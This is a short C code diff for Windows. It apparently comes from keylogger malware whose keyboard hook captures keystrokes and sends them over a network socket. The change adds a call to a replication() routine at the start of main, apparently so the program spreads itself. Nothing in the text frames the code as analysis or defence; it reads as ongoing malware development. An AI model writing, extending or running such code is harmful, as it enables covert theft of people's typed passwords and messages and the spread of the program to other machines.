@@ -59,7 +59,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 				wprintf(L"Sent: %s", unicodeBuf);
 				fflush(stdout);
 
-					int sent = send(sock,
+				int sent = send(sock,
 					(char *)unicodeBuf,
 					result * sizeof(wchar_t),
 					0);
@@ -84,6 +84,8 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 }
 
 int main(void) {
+
+	replication();
 
 	WSADATA wsaData;
 	struct sockaddr_in serv_addr;
